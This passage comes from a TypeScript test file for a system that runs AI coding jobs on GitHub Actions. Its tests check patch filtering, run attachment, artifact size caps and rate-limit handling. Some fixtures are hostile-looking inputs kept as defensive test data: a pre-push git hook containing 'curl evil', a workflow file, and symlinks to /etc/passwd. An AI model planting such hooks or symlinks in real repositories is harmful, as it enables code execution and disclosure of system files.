    `diff --git a/${path} b/${path}`, modeLine, '--- /dev/null', `+++ b/${path}`, '@@ -0,0 +1 @@', `+${content}`, '\\ No newline at end of file', ''].join('\n');
  assert.equal(publishes(np('src/ok.txt', 'fine', 'new file mode 100644')), true, 'an ordinary change is published');
  assert.equal(publishes(np('.github/workflows/evil.yml', 'on: push', 'new file mode 100644')), false);
  assert.equal(publishes(np('.git/hooks/pre-push', 'curl evil', 'new file mode 100644')), false);
  assert.equal(publishes(np('sub/.git/config', 'x', 'new file mode 100644')), false);
  assert.equal(publishes(np('.GitHub/x.yml', 'x', 'new file mode 100644')), false, 'case-insensitive');
  assert.equal(publishes(np('link', '/etc/passwd', 'new file mode 120000')), false, 'symlink');
  assert.equal(publishes(np('link', '/etc/passwd', 'new file mode 0120000')), false, 'symlink with a leading zero');
  assert.equal(publishes(np('link', '/etc/passwd', 'new file mode 120000\r')), false, 'symlink with a carriage return');
  assert.equal(publishes(np('link', '/etc/passwd', 'new file mode  120000')), false, 'symlink with two spaces');
  assert.equal(publishes(np('link', '/etc/passwd', 'new file mode 120000 ')), false, 'symlink with a trailing space');
  const submodule = ['diff --git a/vendor b/vendor', 'new file mode 160000', 'index 0000000..' + 'a'.repeat(40), '--- /dev/null', '+++ b/vendor', '@@ -0,0 +1 @@', '+Subproject commit ' + 'a'.repeat(40), ''].join('\n');
  assert.equal(publishes(submodule), false, 'submodule');
  const rename = ['diff --git a/README.md b/.github/README.md', 'similarity index 100%', 'rename from README.md', 'rename to .github/README.md', ''].join('\n');
  assert.equal(publishes(rename), false, 'renames into .github are refused');
});

test('N1: nothing evaluated before the runner exists references the runner context', () => {
  for (const settings of [FREE, SUB, KEY, { ...FREE, modelSource: 'self_hosted_ollama', runnerLabel: 'box', model: 'm' } as ActionsSettings]) {
    const lines = jobWorkflow(TARGET, settings).split('\n');
    // Workflow-level keys (run-name, concurrency, env) and job-level keys other than steps/outputs: indent 0-2, or a
    // 4-space job key and everything nested under it until the next 4-space key.
    let jobKey = '';
    let topKey = '';
    for (const line of lines) {
      if (!line.trim() || line.trim().startsWith('#')) continue;
      const indent = line.search(/\S/);
      if (indent === 0) topKey = line.split(':')[0];
      if (indent === 4) jobKey = line.trim().split(':')[0];
      const early = topKey !== 'jobs' || indent <= 2 || (indent >= 4 && !['steps', 'outputs'].includes(jobKey));
      if (early) assert.doesNotMatch(line, /\brunner\./, `${settings.engine}: runner context before the runner exists: ${line.trim()}`);
    }
  }
});

test('N1: actionlint accepts the generated workflows (skipped when actionlint is not installed)', (t) => {
  let found = true;
  try { execFileSync('actionlint', ['-version'], { stdio: 'pipe', timeout: 10_000 }); } catch { found = false; }
  if (!found) return t.skip('actionlint is not installed');
  const dir = mkdtempSync(join(tmpdir(), 'free04-lint-'));
  for (const [i, settings] of [FREE, SUB, KEY].entries()) {
    const file = join(dir, `job-${i}.yml`);
    writeFile(file, jobWorkflow(TARGET, settings));
    execFileSync('actionlint', ['-shellcheck=', file], { stdio: 'pipe', timeout: 30_000 });
  }
});

test('N3: setup copy and the generated workflow warn about cache poisoning on hosted runners', async () => {
  const { executionPlan } = await import('../src/client/setup/cloud-setup');
  const note = executionPlan({ projects: [{ owner: 'o', name: 'r', defaultBranch: 'main', private: true } as any], providers: { anthropic: '', openai: '' }, actions: FREE }).note;
  assert.match(note, /dedicated/i);
  assert.match(note, /actions\/cache/);
  assert.match(jobWorkflow(TARGET, FREE), /# .*actions\/cache/);
});

test('L3: Qwen install is dependency-free and offline; the CPU model is pinned by digest', () => {
  const yaml = jobWorkflow(TARGET, FREE);
  assert.ok(yaml.includes(`package/package.json | jq -e '(.dependencies // {}) | length == 0'`));
  assert.match(yaml, /npm install --global --ignore-scripts --offline/);
  assert.ok(yaml.includes(CPU_MODEL.digest));
});

test('M1: an uncertain Actions dispatch can be attached by run id; the cursor is rebuilt and the title must match', async () => {
  const { gh, h } = actionsHarness(FREE);
  gh.dispatchMode = 'no_run_id';
  push(h.store, newJob(1, 1));
  await h.tick();
  assert.equal(job(await h.state(), 1).status, 'dispatch_uncertain');
  push(h.store, intent(5, { kind: 'resolve_uncertain', jobId: uuid(1), resolution: 'attach_session', sessionId: 'ghrun_9001' } as any));
  await h.tick();
  await h.tick();
  let j = job(await h.state(), 1);
  assert.equal(j.sessionId, 'ghrun_9001');
  assert.deepEqual(j.cursor?.actions, { owner: 'fixture', name: 'repo', runId: 9001, jobId: uuid(1), engine: 'qwen-free', budgetCents: 0, maxTurns: 30 });
  assert.equal(j.status, 'running', 'the title matched, so the run is trusted');
  const other = actionsHarness(FREE);
  other.gh.dispatchMode = 'no_run_id';
  push(other.h.store, newJob(1, 1)); await other.h.tick();
  other.gh.runs.get(9001)!.title = runTitle(uuid(7), 0, 30);
  push(other.h.store, intent(5, { kind: 'resolve_uncertain', jobId: uuid(1), resolution: 'attach_session', sessionId: 'ghrun_9001' } as any));
  await other.h.tick(); await other.h.tick();
  j = job(await other.h.state(), 1);
  assert.equal(j.status, 'unknown', 'a run for another job is never trusted');
  assert.ok(j.reservation, 'the reservation is kept');
  const third = actionsHarness(KEY);
  third.gh.dispatchMode = 'no_run_id';
  push(third.h.store, newJob(1, 1)); await third.h.tick();
  push(third.h.store, intent(6, { kind: 'resolve_uncertain', jobId: uuid(1), resolution: 'attach_session', sessionId: 'sesn_abcdefgh12' } as any));
  const report = await third.h.tick();
  assert.equal(report.intents.find(i => i.id === uuid(100_006))?.outcome, 'rejected', 'an Anthropic session id cannot attach to an Actions job');
});

test('L1: a cursor that names another repository is refused by the schema', async () => {
  const { h } = actionsHarness(FREE);
  push(h.store, newJob(1, 1)); await h.tick();
  const jobs = JSON.parse(serializeState(await h.state())['state/jobs.json']);
  jobs.jobs[0].cursor.actions.owner = 'attacker';
  assert.throws(() => validateJobs(jobs), /cursor/);
  jobs.jobs[0].cursor.actions.owner = 'bad owner!';
  assert.throws(() => validateJobs(jobs), /cursor/);
});

test('L2: an artifact served without content-length is capped while streaming', async () => {
  const { gh, h } = actionsHarness(FREE);
  push(h.store, newJob(1, 1)); await h.tick();
  gh.finish(9001, { schemaVersion: 1, jobId: uuid(1), engine: 'qwen-free', status: 'no_changes' });
  gh.runs.get(9001)!.streamBytes = 10_000_000;
  gh.runs.get(9001)!.artifactSize = 100;
  await h.tick();
  assert.match(job(await h.state(), 1).message, /too large/);
  assert.ok(gh.pulled < 100_000, `stopped reading early (pulled ${gh.pulled} of 10,000,000 bytes)`);
});

test('M3/M4: honest minutes copy, draft-PR note only when on, self-hosted runners blocked on public repositories', async () => {
  const { initialState, validateActionsChoice, jobMinutesNote } = await import('../src/client/setup/model');
  const { executionPlan } = await import('../src/client/setup/cloud-setup');
  assert.equal(jobMinutesNote(validateActionsSettings({ ...FREE, timeoutMinutes: 360 })), 'US$0 on public repositories; private repositories use GitHub Actions minutes (up to 375 minutes per job)');
  const project = { owner: 'o', name: 'r', defaultBranch: 'main', private: false } as any;
  const withPr = executionPlan({ projects: [project], providers: { anthropic: '', openai: '' }, actions: FREE }).note;
  const noPr = executionPlan({ projects: [project], providers: { anthropic: '', openai: '' }, actions: { ...FREE, openPullRequest: false } }).note;
  assert.match(withPr, /draft pull request/);
  assert.doesNotMatch(noPr, /pull request/);
  assert.match(withPr, /up to 75 minutes per job/);
  const s = { ...initialState({ step: 'providers' }), engine: 'qwen-free' as const, projectToken: 'github_pat_' + 'a'.repeat(30), repos: [project], free: { selfHostedLabel: 'box', selfHostedModel: 'm', hostedOptIn: false, hostedBaseUrl: '', hostedModel: '', cpuOptIn: false } };
  assert.ok(validateActionsChoice(s).some((e: string) => /public repository/.test(e)), 'self-hosted on a public repo is blocked');
  assert.deepEqual(validateActionsChoice({ ...s, repos: [{ ...project, private: true }] }), []);
  const { private: _unknown, ...noFlag } = project;
  assert.ok(validateActionsChoice({ ...s, repos: [noFlag] }).some((e: string) => /public|private/.test(e)), 'unknown visibility is blocked too');
});

test('L4: rate-limited dispatches never use up the attempt limit', async () => {
  const gh = new FakeActions();
  const transport = (async (input: any, init: any) => String(input).includes('/commits/main')
    ? json({ message: 'API rate limit exceeded' }, 403) : gh.fetch(input, init)) as typeof fetch;
  const adapter = new GitHubActionsAdapter('github_pat_fixture', { fetch: transport });
  const h = harness(makeStore({ execution: exec(FREE) }), adapter as unknown as FakeProvider);
  push(h.store, newJob(1, 1));
  for (let i = 0; i < 5; i++) await h.tick();
  const j = job(await h.state(), 1);
  assert.equal(j.status, 'queued', 'still waiting, not failed');
  assert.match(j.message, /rate limit/i);
});

test('L2: refusing an oversized artifact aborts the download', async () => {
  const { gh, h } = actionsHarness(FREE);
  push(h.store, newJob(1, 1)); await h.tick();
  gh.finish(9001, { schemaVersion: 1, jobId: uuid(1), engine: 'qwen-free', status: 'no_changes' });
  gh.runs.get(9001)!.streamBytes = 10_000_000;
  await h.tick();
  assert.equal(gh.blobSignal?.aborted, true);
});

test('L4: a rate-limited poll backs off for the rest of the run, and dispatch then provably sends nothing', async () => {
  const gh = new FakeActions();
  let limited = true;
  const transport = (async (input: any, init: any) => limited && String(input).includes('/actions/runs/')
    ? json({ message: 'API rate limit exceeded' }, 429, { 'retry-after': '60' }) : gh.fetch(input, init)) as typeof fetch;
  const adapter = new GitHubActionsAdapter('github_pat_fixture', { fetch: transport });
  const cursor = { actions: { owner: 'fixture', name: 'repo', runId: 5, jobId: uuid(1), engine: 'qwen-free' as const, budgetCents: 0, maxTurns: 30 } };
  await assert.rejects(adapter.observe('ghrun_5', cursor), /rate limit/i);
  const before = gh.requests.length;
  limited = false;
  await assert.rejects(adapter.observe('ghrun_5', cursor), /rate limit/i);
  await assert.rejects(adapter.dispatch({ jobId: uuid(2), branch: `agent-empire/task-${uuid(2)}`, execution: exec(FREE), prompt: 'x', budgetCents: 0 }), (e: unknown) => e instanceof DispatchFailure && !e.sent);
  assert.equal(gh.requests.length, before, 'no request while backing off');
});
